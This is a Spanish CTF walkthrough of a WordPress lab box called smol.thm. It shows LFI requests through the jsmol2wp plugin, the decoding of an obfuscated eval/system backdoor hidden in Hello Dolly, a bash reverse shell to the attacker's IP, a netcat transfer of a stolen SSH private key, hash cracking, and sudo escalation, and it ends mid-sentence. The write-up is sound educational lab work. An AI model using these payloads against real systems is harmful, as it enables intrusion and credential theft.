# <font color=red>[+]</font> Reconocimiento

```bash
sudo nmap -p- -sS -Pn -n -vvv --min-rate 3000 $IP

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http    syn-ack ttl 62
```

```bash
sudo nmap -p 22,80 -sVC -Pn -n --min-rate 3000 $IP

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d:d5:27:df:18:b2:0c:40:b5:87:c0:04:9b:d5:f4:3f (RSA)
|   256 db:28:6f:e0:bc:d2:52:44:98:99:e7:af:64:2e:ba:53 (ECDSA)
|_  256 dd:fa:a4:19:c0:04:15:88:96:7a:87:43:e8:cc:ed:09 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://www.smol.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# <font color=red>[~]</font> Entorno Web

Al tratar de acceder a la web, nos daremos cuenta de que no será posible debido a que el navegador se quedará cargando o nos mostrará un mensaje de error.

Si realizamos la consulta con `curl` veremos que la Web nos redirige a: `http://www.smol.thm`.

```HTTP
curl http://$IP -I

HTTP/1.1 302 Found
Date: Tue, 04 Aug 2026 15:59:15 GMT
Server: Apache/2.4.41 (Ubuntu)
Location: http://www.smol.thm
Content-Type: text/html; charset=UTF-8
```

>Esto quiere decir que la razón por la que no podemos acceder a la Web es debido a que el servicio DNS no puede resolver el nombre `www.smol.thm` hacia la IP del servidor.

La solución a esto es modificar el archivo `/etc/hosts` añadiendo la correlación de IP con el nombre de dominio y subdominio.

```bash
sudo vim /etc/hosts

$IP  www.smol.thm
```

Podemos corroborar que ha funcionado realizando un `ping` hacia el nombre de dominio:

```bash
ping -c 2 www.smol.thm
```

### <font color=red>[-]</font> Análisis de tecnologías

Podemos conocer las tecnologías que usa el servidor web con herramientas como `whatweb` (*CLI*) o `Wappalyzer` (*Extensión del navegador*).

```bash
whatweb http://www.smol.thm

http://www.smol.thm [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[admin@smol.thm], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[$IP], JQuery[3.7.1], MetaGenerator[WordPress 6.7.1], Script[importmap,module], Title[AnotherCTF], UncommonHeaders[link], WordPress[6.7.1]
```

Con la salida de `whatweb` podemos ver información muy interesante:

- ***Email de contacto del administrador del sitio web***: `admin@smol.thm`
- ***Versiones de FrameWorks***: `JQuery[3.7.1]`
- ***WordPress***: `WordPress[6.7.1]`

### <font color=red>[-]</font> WordPress

>[!Note]
>***[Información de WordPress](#wordpress)***

Existe una herramienta especializada llamada ***WPScan***, el cual consiste en un escáner de seguridad de código abierto diseñado epecíficamente para realizar auditorías de tipo "*caja negra*" en sitios web construidos con  *WordPress*.

#### 1. Actualizar la base de datos de `wpscan`
Lo primero que debemos de hacer antes de usar la herramienta es actualizar su base de datos. Esto nos asegura que el escáner reconozca las ***vulnerabilidades más recientes*** y los vectores de ataque descubiertos hasta la fecha.

```bash
wpscan --update

[i] Updating the Database ...
[i] Update completed.
```

#### 2. Reconocimiento inicial

>[!Note]
>Cuando ejecutamos `wpscan` sin banderas avanzadas de enumeración, la herramienta realiza lo que se conoce como ***Detección Pasiva y Análisis de Huella Digital (Fingerprinting)***. En este proceso, el escáner analiza los encabezados HTTP y el código fuente devuelto por la página principal sin realizar peticiones agresivas de fuerza bruta.
>
>Durante esta fase inicial, `wpscan` identifica automáticamente:
>- ***Servidor Web y Tecnologías***: - Encabezados HTTP (`Server`, `X-Powered-By`), presencia de firewalls de aplicaciones web (WAF) o servicios de CDN.
>- ***Versión del Núcleo de WordPress (_WordPress Core_)*:** Analiza etiquetas meta en el HTML (`<meta name="generator" content="WordPress X.X">`), enlaces a archivos de estilo/scripts (`?ver=X.X`) y archivos estándar como `readme.html`.
>- ***Tema Activo (_Theme_)*:** Examina las rutas de los archivos CSS dentro de `/wp-content/themes/` para determinar el tema en uso y buscar vulnerabilidades asociadas a su versión.  
>- ***Plugins Visibles*:** Detecta pasivamente los plugins que cargan código JavaScript o CSS en la página de inicio.

>[!important]
>*El reconocimiento inicial nos proporciona una visión general del objetivo sin generar un volumen alto de tráfico en los registros (logs) del servidor. Sin embargo, para descubrir componentes ocultos o no enlazados en la portada (como plugins sin estilos en la home o la lista completa de usuarios), es necesario pasar a una fase de **Enumeración Específica (`--enumerate`)**.*

Para iniciar el análisis, ejecutamos una inspección básica indicando la URL del objetivo:

```bash
wpscan --url http://www.smol.thm

Interesting Finding(s):

<snip>

[+] XML-RPC seems to be enabled: http://www.smol.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)

<snip>

[+] WordPress version 6.7.1 identified (Insecure, released on 2024-11-21).
 | Found By: Rss Generator (Passive Detection)

<snip>

[+] WordPress theme in use: twentytwentythree
 | [!] The version is out of date, the latest version is 1.6
 | [!] Directory listing is enabled
 | Found By: Style (Passive Detection)
 |  - http://www.smol.thm/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] jsmol2wp
 | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt

<snip>
```

Este escaneo nos permite ver algunos puntos interesantes como que el *endpoint* ***xmlrpc.php*** está activo en la instalación de WordPress. Esto es importante debido a que el protocolo ***XML-RPC*** nos permite realizar ataques de fuerza bruta de forma mucho más eficaz que si la realizáramos sin este protocolo.

Además podemos ver que tiene instalado un plugin llamado ***jsmol2wp***. Puede ser un vector de ataque importante, por lo que buscaremos más información sobre él.

### `jsmol2wp`

>***[Explicación sobre Vulnerabilidad CVE-2018-20463](https://pentest-tools.com/vulnerabilities-exploits/wordpress-jsmol2wp-107-local-file-inclusion_2654)***

En esta web podemos ver que la versión `1.07` de este plugin es vulnerable a ***LFI*** a través del parámetro `?query=php://filter/resource=` del *endpoint* `jsmol.php`. Para comprobar la vulnerabilidad podemos tratar de leer el archivo `/etc/passwd`.

```bash
curl "http://www.smol.thm//wp-content/plugins/jsmol2wp/php/jsmol.php?query=php://filter/resource=/etc/passwd" -i

root:x:0:0:root:/root:/usr/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
<snip>
```

Conseguimos leer el contenido del archivo y comprobamos la existencia de la vulnerabilidad. Sabiendo todo esto, lo primero que se me ocurre es tratar de realizar un ***LOG Poisoning*** hacia el registro de acceso del servidor ***Apache***.

Para ello, primero compruebo si puedo acceder al archivo con los registros de acceso al servidor:

```bash
curl "http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?query=php://filter/resource=/var/log/apache2/access.log" -i
```

Pero no pude acceder al contenido del archivo. Por lo que tras unos cuantos intentos más, me di por vencido y pasé a otro vector de ataque. Se me ocurrió tratar de acceder al archivo `wp-config.php`, para tratar de obtener posibles usuarios y contraseñas que poder usar para obtener acceso al sistema o al *Dashboard* de WordPress.

```bash
curl "http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?query=php://filter/resource=../../../../wp-config.php" -i

<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */
<snip>
```

***ÉXITO!*** Conseguimos obtener unas credenciales que podemos usar para tratar de obtener acceso al *Dashboard* de WordPress. Para obtener acceso al *Dashboard* de WordPress deberemos de navegar hacia le endpoint `http://www.smol.thm/wp-login.php` desde nuestro navegador.

Una vez dentro podremos llegar a la conclusión de que no somos administradores ni tenemos privilegios elevados con los que poder modificar plantillas de páginas por defecto (como la `404.php`) o poder subir un plugin malicioso que nos devuelva una reverse shell a nuestra máquina atacantes. Por lo que tendremos que seguir tratando de encontrar alguna configuración o vulnerabilidad que nos permita escalar privilegios o realizar una ***RCE (Ejecución Remota de Comandos)*** conla que trata de obtener una ***reverse shell***.

>[!Note]
>Si queremos confirmar que no somos usuarios administradores (*opcional*), podemos realizar una consulta a `xmlrpc.php`.
>
>```bash
>curl -X POST "http://www.smol.thm/xmlrpc.php" -d "
><methodCall>
>	<methodName>wp.getUsersBlogs</methodName>
>	<params>
>		<param><value>[username]</value></param>
>		<param><value>[password]</value><param>
>	</params>
></methodCall>
>"
>
><?xml version="1.0" encoding="UTF-8"?>
><methodResponse>
>	<params>
>		<param>
>			<value>
>			<array><data>
>				<value><struct>
>					<member><name>isAdmin</name><value><boolean>0</boolean></value></member>
>	...
></methodResponse>
>```
>
>En la respuesta podemos comprobar que ***NO*** es un usuario administrador.

### `Hello Dolly`

Si vemos las páginas publicadas podremos ver que existe un página privada llamada `Webmaster Taksks!!`. Parece ser una página de tareas para el administrador del sitio. Estos documentos son de especial importancia ya que muchas veces revelan información sobre vulnerabilidades o configuraciones inseguras que aún no se han modificado, dándonos pistas sobre posibles vectores de entrada al sistema o a escalada de privilegios.

Esta lista contiene 11 tareas de seguridad importantes, pero la que me llama la atención es la primera:

```
1- [IMPORTANT] Check Backdoors: Verify the SOURCE CODE of "Hello Dolly" plugin as the site's code revision.
```

Aparentemente hay un plugin denominado `Hello Dolly` que puede contener un ***Backdoor***?

#### Qué es `Hello dolly`?

El plugin `Hello Dolly`  es el plugin predeterminado más antiguo de WordPress. Su función principal es mostrar una letra aleatoria de la canción "*Hello, Dolly!*" en la parte superior derecha del panel de administración de WordPress.

Aunque no ofrece utilidad práctica para el funcionamiento del sitio (*no mejora el SEO, la seguridad ni el rendimiento*), tiene un valor histórico y educativo significativo:

- ***Símbolo Histórico:*** Representa el entusiasmo de la primera generación de usuarios de WordPress. ha estado incluido por defecto desde la `versión 1.2`.
- ***Herramienta  Educativa:*** Originalmente diseñado como un ejemplo simple para que los nuevos desarrolladores entendieran la estructura básica de un plugin, el uso de *hooks* y cómo interactuar con el núcleo de WordPress.
- ***Estado actual:*** A pesar de los debates recurrentes en la comunidad para eliminarlo del núcleo por considerarlo obsoleto, sigue incluido en las instalaciones por defecto (versión 1.7.2) como una tradición.

***Es totalmente seguro eliminarlo***. De hecho, es una práctica común desactivarlo y borrarlo inmediatamente después de instalar WordPress para mantener el entorno limpio.

Si miramos cual es la estructura de archivos de este plugin veremos que hay dos versiones:

1. ***Rutas actuales (WordPress 6.9+)***: en las versiones más recientes, el plugin reside en su propio directorio:
   - ***Directorio principal***: `/wp-content/plugins/hello-dolly/`
   - ***Archivo principal***: `/wp-content/plugins/hello-dolly/hello.php`

   Esta actualización mueve el archivo `hello.php`dentro de una carpeta contenedora (`hello-dolly`) para alinearse con el estándar del repositorio de plugins, evitando conflictos de nombres y facilitando la gestión de actualizaciones.

2. ***Rutas antiguas (WordPress 6.8 y anteriores)***:
   - ***Archivo único:*** `/wp-content/plugins/hello.php`
   
   En esta versión histórica, el archivo PHP residía directamente en la carpeta `plugins` sin un subdirectorio propio. Si actualizamos desde una versión antigua, WordPress migra automáticamente el plugin a la nueva estructura.

Como nuestra versión de WordPress es la `6.7.1` (menor a la `6.9`), nuestro archivo `hello.php` debería de estar en la ruta `http://www.smol.thm/wp-content/plugins/hello.php`. No obstante, si tratamos de acceder al archivo desde esta ruta obtendremos un `código 500 Iternal Server Error`.

##### Por qué ocurre esto?

Al tratar de acceder directamente mediante una petición `GET` sin usar el flujo principal de la aplicación (`wp-load.php`), las llamadas a funciones nativas de la API de WordPress (como `add_action()`) desencadenan un error fatal de PHP (`Uncaught Error: Call to undefined function`), el cual es enmascarado como un error `500` por la configuración del servidor.

De hecho, aunque el código no usara ninguna función de la API de WordPress y nos devolviera un `código 200 OK`, no podríamos haber visto el código PHP, ya que este habría sido ejecutado por el servidor.

##### Cómo podemos ver su contenido entonces?

Recordemos que podemos usar la vulnerabilidad ***LFI*** en el plugin de `jsmol2wp` para ver el código como un simple archivo de texto (`.txt`).

```bash
curl -s "http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?query=php://filter/resource=../../hello.php" -i
```

Esta consulta nos devuelve el código PHP del plugin, y cuando lo revisamos nos damos cuenta de algo muy interesante:

```php
function hello_dolly() {
	eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
	
<snip>
```

En la función `hellodolly()`, se hace uso de la función `eval()` sobre la decodificación desde `base64` de un código ilegible por humanos.

Podemos decodificar el código de la siguiente manera:

```bash
echo "[CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=]" | base64 -d

if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }
```

Podemos ver que lo que estaba codificado era una condición:

- Verifica si en la consulta `GET` hay un parámetro `"\143\155\x64"`.
	- Si existe, se ejecuta el valor de dicho parámetro en el servidor.

Pero que son esos caracteres extraños `\143\155\x64` y `\143\x6d\144`? Estos caracteres son ***valores Octales y Hexadecimales*** que el desarrollador del *backdoor* usó para representar el valor que deben tener los parámetros para que no se lean a simple vista.

Si traducimos esos códigos a texto plano (ASCII):

- `\143` (Octal 143) = **`c`**
- `\155` (Octal 155) = **`m`**
- `\x64` (Hexadecimal 64) = **`d`**

En ambas representaciones, la palabra es `cmd`. Por lo que el código *desofuscado* se ve así:

```PHP
if (isset($_GET["cmd"])) {
	sytem($_GET["cmd"]);
}
```

>[!warning]
>***Este es el backdoor del que se hablaba en la lista de tareas del administrador.***

# <font color=red>[+]</font> Explotación

Para poder usar este ***backdoor*** debemos de realizar la siguiente petición desde nuestro navegador (ya que necesitamos estar tener una sesión logueados):

```
http://www.smol.thm/wp-admin/index.php?cmd=whoami
```

En el *dashboard* de WordPress podremos ver en la parte superior `www-data` (el usuario del servicio `httpd`). Por lo que comprobamos que tenemos un ***RCE (Ejecución Remota de Comandos)***. Ahora nuestra prioridad es tratar de obtener una *Reverse Shell* con la que ganar control del sistema operativo, al menos como el usuario `www-data`.

Para ello podemos, podemos ir a la web ***[revshells](https://www.revshells.com/)*** en la que podremos obtener el código para una reverse shell.

>[!Note]
>Estuve probando varias formas de obtener la reverse shell y no conseguía obtenerla de forma definitiva. Esto se debe a la codificación URL que transforma algunos símbolos necesarios para la creación de la reverse shell en otros.
>
>Para solucionar esto, la forma más eficaz es codificar el *payload* en `base 64`. Sin embargo, existe la opción de que en el *payload* codificado existan símbolos como el `+` que en la codificación URL representan un espacio. Por lo que tendremos que transformar estos símbolos a su correspondiente codificación en URL.
>
>```bash
>echo "/bin/bash -i >& /dev/tcp/<IP_KALI>/puerto 0>&1 | base64 | sed -e 's/+/%2B/g"
>```
>
>Para que la reverse shell se ejecute de forma correcta, deberemos ejecutar estos comandos:
>
>```bash
># Creamos el listener que recibirá la reverse shell
>nc -lvnp <puerto>
>```
>
>```
>http://www.smol.thm/wp-admin/?cmd=echo <codigo base64> | base64 -d | bash
>```
>
>De esta forma recibiremos la reverse shell en nuestro *listener*.

>[!Note]
>He creado una pequeña herramienta de línea de comandos que automatiza el proceso de explotación de la vulnerabilidad.
>
>***Recomiendo encarecidamente primero explotarla de forma manual para comprender como funciona realmente.***
>
>***[Código ➔](./exploit.py)***

# <font color=red>[+]</font> Post-Explotación

Una vez dentro del sistema, deberemos de hacer un tratamiento a la pseudoterminal para obtener una PTY completa real.

## <font color=red>[~]</font> Tratamiento de PseudoTerminal

Cuando obtenemos la reverse shell, lo que realmente obtenemos es una pseudoterminal con muchas limitaciones. Para pasar de esto a una PTY real debemos de seguir los siguientes pasos:

```bash
# Llamamos a la sehll bash diciendo que lo que hagamos se guarde en el agujero negro de linux (/dev/null)
script -c bash /dev/null

# Pausamos un momento la conexión
CTRL+C

# Configuramos la terminal y volvemos a la reverse shell
stty raw -echo ; fg

enter

# Configuramos la variable de entorno TERM para poder usar herramientas como clear
export TERM=xterm

# Configuramos la variable de entorno PS1 para que el prompt no nos moleste
export PS1="\w$ "
```

## <font color=red>[~]</font> Escalada de privilegios a `diego`

Después de estar investigando el sistema, me doy cuenta de que está corriendo un servicio en el puerto `3306`. Este es el puerto por defecto del ***Sistema Gestor de Bases de Datos MySQL***, por lo que trato de conectarme a él con las credenciales que obtuvimos antes (las mismas que con la que obtuvimos acceso al *dashboard* de WordPress).

```bash
mysql -h localhost -u wpuser -p
# Nos pedira la contraseña, una vez la introduzcamos veremos el prompt para comunicarnos con el SGBD

mysql>

# Primero vemos las bases de datos que existen en el SGBD
mysql> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |
+--------------------+

# La única base de datos que no es por defecto en MySQL es wordpress (base de datos que almacena la información del CMS)

# Podemos ver las tablas de la base de datos para saber que puede ser un buen vector de ataque

mysql> SHOW TABLES FROM wordpress;
+---------------------------+
| Tables_in_wordpress       |
+---------------------------+
| <snip>                    |
| wp_users                  |
| <snip>                    |
+---------------------------+

# Vemos una tabla que parece almacenar la informacion de los usuarios de WordPress
# Para poder hacer una consulta coherente debemos de cononcer sus columnas

mysql> SHOW COLUMNS FROM wordpress.tables;
+---------------------+-----------------+------+-----+---------------------+----------------+
| Field               | Type            | Null | Key | Default             | Extra          |
+---------------------+-----------------+------+-----+---------------------+----------------+
| ID                  | bigint unsigned | NO   | PRI | NULL                | auto_increment |
| user_login          | varchar(60)     | NO   | MUL |                     |                |
| user_pass           | varchar(255)    | NO   |     |                     |                |
| user_nicename       | varchar(50)     | NO   | MUL |                     |                |
| user_email          | varchar(100)    | NO   | MUL |                     |                |
| user_url            | varchar(100)    | NO   |     |                     |                |
| user_registered     | datetime        | NO   |     | 0000-00-00 00:00:00 |                |
| user_activation_key | varchar(255)    | NO   |     |                     |                |
| user_status         | int             | NO   |     | 0                   |                |
| display_name        | varchar(250)    | NO   |     |                     |                |
+---------------------+-----------------+------+-----+---------------------+----------------+

# Vemos que podemos ver las contraseñas de los usuarios
# Para verlas sabiendo a que usuario corresponde cada contraseña podemos realizar la siguiente consulta

mysql> SELECT user_login, user_pass FROM wordpress.wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. |
| wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. |
| think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ |
| gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 |
| diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 |
| xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 |
+------------+------------------------------------+
```

Las contraseñas, como era de esperar, están ***hasheadas***. Lo que significa que no podremos saber las contraseñas en texto plano, ha no ser que seamos capaces de crackearlas.

### <font color=red>[-]</font> Cracking de contraseñas

Estos hashes corresponden al formato ***phpass (Portable PHP password hashing framework)***, utilizado principalmente por ***WordPress*** (versiones 2.5 a 6.7) y otros sistemas como ***phpBB***.

>[!important]
>Una cosa importante es el caracter que está tras el segundo `$` (`B`). Este caracter indica el ***costo*** o número de iteraciones. En este caso, la `B` representa 2^11 (*2048*) iteraciones.
>
>Esto es relevante ya que normalmente WordPress usa `H` o valores que equivales a *8192* iteraciones. Por lo que parece ser que el creador del CTF nos está ayudando a que el crackeo de las contraseñas no sea extremadamente largo.

Para poder crackear las contraseñas, deberemos de copiar los hashes a un archivo en nuestra máquina atacante. Una vez tengamos los hashes en un archivo, podemos usar `hashcat` o `john` para crackearlas.

>[!important]
>Si nuestra máquina actante cuenta con una GPU potente, es más rentable usar `hashcat` ya que esta herramienta utiliza la potencia de nuestra GPU para crackear los hashes más rápido.
>
>No obstante, si no contamos con este hardware, `john` es una mejor opción.

>***En mi caso usaré hashcat***

Podemos conocer cual es el módulo para el formato ***phpass*** consultando el manual de hashcat desde la web o usando la herramienta `man hashcat` en nuestra terminal.

```bash
man hashcat

<snip>
400 = phpass, MD5(Wordpress), MD5(phpBB3), MD5(Joomla)
<snip>

# 400 es el módulo que debemos de usar
```

Para iniciar la fuerza bruta para crackear la contraseña usamos el siguiente comando:

```bash
# El ataque puede tardar un rato
hashcat -m 400 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1:[contraseña]
```

- `-m 400`: Especifica el algoritmo **phpass**. 
- `-a 0`: Define el modo de ataque **Straight** (diccionario simple). 
- `hashes.txt`: Archivo que contiene los hashes (uno en cada línea) (ej. `$P$B...`).
- `wordlist.txt`: Archivo de diccionario (ej. `rockyou.txt`).

## <font color=red>[~]</font> Escalada de privilegios a `think`

Cuando somos el usuario `diego`, podemos ver que pertenecemos al grupo `internal`. Si nos fijamos en los permisos de los directorios `/home` de cada usuario, podemos darnos cuenta de que `/home/think` tiene permisos de lectura y ejecución para los usuarios del grupo `internal`.

Si listamos su contenido vemos que tiene configurado un subdirectorio `/.ssh`, en el cual encontramos estos tres archivos.

```
-rwxr-xr-x 1 think think     572 Jun 21  2023 authorized_keys
-rwxr-xr-x 1 think think    2.6K Jun 21  2023 id_rsa
-rwxr-xr-x 1 think think     572 Jun 21  2023 id_rsa.pub
```

- `authorized_keys`: Almacena las claves públicas de los usuarios que pueden conectarse vía `ssh` como el usuario `think`. Si tuviéramos permisos de escritura, podríamos crear un par de claves `ssh-rsa` y almacenar la clave pública en este archivo y de esta forma conectarnos con la clave privada que hemos creado.
- `id_rsa`: Clave ***PRIVADA*** `ssh-rsa`. Con la clave que contiene este archivo podemos conectarnos vía `ssh`.
- `id_rsa.pub`: Clave pública `ssh-rsa`.

Como tenemos permisos de lectura sobre los archivos, la mejor opción es llevar la clave privada hacia nuestra máquina atacante. Para ello:

```bash
# En nuestra máquina atacante
# Levantamos un listener por algún puerto registrado que esté libre y redirigimos la salida a un archivo que contendrá la clave enviada
nc -lp 5556 > id_rsa_think

# En la máquina víctima
# Usamos netcat para enviar el contenido del archivo
nc <IP_KALI> 5556 < /home/think/.ssh/id_rsa
```

Una vez tengamos la clave en nuestra máquina, deberemos modificar sus permisos para que no nos de un error a la hora de conectarnos vía `ssh`.

```bash
chmod 600 id_rsa_think
```

Una vez listos, nos conectaremos usando la clave `ssh-rsa`:

```bash
ssh think@www.smol.thm -i id_rsa_think
```

## <font color=red>[~]</font> Escalada de privilegios a `gege`

Tras estar un buen rato buscando vectores de ataque para escalar privilegios sin éxito, probé a usar `su` por si el usuario `gege` o `xavi` no tuvieran una contraseña establecida. No obstante, paso algo extraño: Al usar `su gege` no se me pidió ninguna contraseña y se me dio acceso directamente.

Me puse a investigar porque sucedía esto y la respuesta está en el archivo de configuración `/etc/pam.d/su` (***[Explicación](#/etc/pam.d/su)***).

## <font color=red>[~]</font> Escalada de privilegios a `xavi`

Dentro del directorio `/home/gege` encontramos un archivo `wordpress.old.zip`. Parece ser un *backup* antiguo de CMS, lo que puede contener información muy relevante para la escalada de privilegios.

Si tratamos de descomprimirlo con `unzip wordpress.old.zip` nos pedirá una contraseña. Y si no la introducimos, descomprimirá algunos subdirectorios que no contienen nada relevante. por lo que decido descargar el archivo en mi máquina atacante para tratar de crackear la contraseña una vez más.

```bash
# En la máquina víctima
# Vemos si tiene python instalado
which python3
/usr/bin/python3

# Levantamos un servidor http desde el directorio /home/gege
cd /home/gege

python3 -m http.server

# En nuestra máquina atacate
# Usamos wget para descargar el archivo
wget http://www.smol.thm:8000/wordpress.old.zip
```

Una vez tengamos el archivo en nuestra máquina, podemos usar herramientas para tratar de crackear la contraseña:

```bash
# Usamos zip2john para sacar el hash de la contraseña del zip
zip2john wordpress.old.zip > hash.txt

# Usamos john para crackear la contraseña
john hash.txt --wordlist=/usr/share/wordlist/rockyou.txt
```

Una vez tengamos la contraseña, la usaremos para descomprimir por completo en archivo, y encontraremos un nuevo archivo `wp-config.php`. Dentro de este archivo, encontraremos la contraseña del usuario `xavi`.

## <font color=red>[~]</font> Escalada de privilegios a `root`

Aprovechando que tenemos al contraseña del usuario `xavi`, listamos las herramientas que puede usar con privilegios elevados `sudo`.

```bash
sudo -l

Matching Defaults entries for xavi on ip-10-129-170-106:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on ip-10-129-170-106:
    (ALL : ALL) ALL
```

***Podemos usar todas las herramientas como `root`***, por lo que para escalar privilegios hasta `root` tan solo debemos ejecutar el comando `sudo su`.

---

# Explicaciones

## WordPress

***WordPress*** es un ***sistema de gestión de contenidos (CMS)*** de código abierto y gratuito, desarrollado en ***PHP*** y que utiliza bases de datos como ***MySQL*** o ***MariaDB***. ***WordPress*** ha evolucionado hasta convertirse en la herramienta líder mundial para crear cualquier tipo de sitio web, desde blogs personales hasta tiendas en línea y portales corporativos.

Su principal ventaja es al ***facilidad de uso***, que permite a usuarios sin conocimientos técnicos gestionar su presencia digital mediante una interfaz intuitiva. La plataforma se basa en una arquitectura flexible compuesta por el ***núcleo*** (*software base*), ***temas*** (*para el diseño visual*) y ***plugins*** (*para añadir funcionalidades*), lo que ha permitido que impulse aproximadamente el ***43% de todos los sitios web*** en Internet.

### Plugins

>Las vulnerabilidades en los plugins de WordPress constituyen el principal vector de ataque contra este CMS.

A diferencia del núcleo de WordPress, que es altamente seguro y auditado, los plugins son desarrollados por terceros con estándares variables, lo que ha generado un promedio de más de ***250 vulnerabilidades nuevas por semana*** en 2026. Las fallas más criticas y frecuentes incluyen la ***Ejecución de Srcipts entre sitios (XSS)***, segida por la ***Falsificación de Solicitudes entre sitios (CSRF)*** y fallos de autenticación que permiten a atacantes tomar el control del sitio sin necesidad de credenciales.

Un problema estructural grave es la lentitud en las correcciones: el ***46% de las vulnerabilidades se hacen públicas sin un parche disponible***, y el tiempo medio para que los *bots* comiencen a explotar una falla divulgada es de apenas ***5 horas***, dejando a los sitios que no se actualizan inmediatamente expuestos a compromisos masivos, inyección de malware y robo de datos.

---
## /etc/pam.d/su

```bash
#
# The PAM configuration file for the Shadow `su' service
#

# This allows root to su without passwords (normal operation)
auth       sufficient pam_rootok.so
auth  [success=ignore default=1] pam_succeed_if.so user = gege
auth  sufficient                 pam_succeed_if.so use_uid user = think
# Uncomment this to force users to be a member of group root
# before they can use `su'. You can also add "group=foo"
# to the end of this line if you want to use a group other
# than the default "root" (but this may have side effect of
# denying "root" user, unless she's a member of "foo" or explicitly
# permitted earlier by e.g. "sufficient pam_rootok.so").
# (Replaces the `SU_WHEEL_ONLY' option from login.defs)
# auth       required   pam_wheel.so

# Uncomment this if you want wheel members to be able to
# su without a password.
# auth       sufficient pam_wheel.so trust

# Uncomment this if you want members of a specific group to not
# be allowed to use su at all.
# auth       required   pam_wheel.so deny group=nosu

# Uncomment and edit /etc/security/time.conf if you need to set
# time restrainst on su usage.
# (Replaces the `PORTTIME_CHECKS_ENAB' option from login.defs
# as well as /etc/porttime)
# account    requisite  pam_time.so

# This module parses environment configuration file(s)
# and also allows you to use an extended config
# file /etc/security/pam_env.conf.
# 
# parsing /etc/environment needs "readenv=1"
session       required   pam_env.so readenv=1
# locale variables are also kept into /etc/default/locale in etch
# reading this file *in addition to /etc/environment* does not hurt
session       required   pam_env.so readenv=1 envfile=/etc/default/locale

# Defines the MAIL environment variable
# However, userdel also needs MAIL_DIR and MAIL_FILE variables
# in /etc/login.defs to make sure that removing a user 
# also removes the user's mail spool file.
# See comments in /etc/login.defs
#
# "nopen" stands to avoid reporting new mail when su'ing to another user
session    optional   pam_mail.so nopen

# Sets up user limits according to /etc/security/limits.conf
# (Replaces the use of /etc/limits in old login)
session    required   pam_limits.so

# The standard Unix authentication modules, used with
# NIS (man nsswitch) as well as normal /etc/passwd and
# /etc/shadow entries.
@include common-auth
@include common-account
@include common-session
```

El comportamiento que estamos observando se debe a cóm el marco ***PAM (Pluggable Authetication Modules)*** de Linux procesa secuencialmente sus reglas de autenticación y a la combinación del módulo `pam_succeded_if.so` con el *flag* de control `sufficient`.

Esta configuración crea efectivamente una ***excepción condicional de autenticación sin contraseña*** (un bypass del módulo estándar de contraseñas) para un usuario específico.

### Conceptos clave de PAM necesarios para entender la regla

Para comprender el flujo, hay tres conceptos fundamentales de la sintaxis de `/etc/pam.d/su`:

1. `pam_succeded_if.so`: Módulo que evalúa condiciones del entorno (como e usuario actual, el usuario objetivo, el UID o la pertenencia a un grupo).
2. ***Flag `sufficient`***: Indica que si el módulo devuelve éxito (y no ha fallado ningún módulo `required` previo), la ***autenticación se da por aprobada inmediatamente*** y PAM ignora todos los módulos siguientes (incluyendo la petición de contraseña en `@include common-auth`)
3. ***Sintaxis de salto `[success=ignore default=1]`***: Funciona como una estructura condicional (*IF/ELSE*):
   - `success=ignore`: Si la condición se cumple, ignora este resultado y pasa a la línea inmediatamente siguiente.
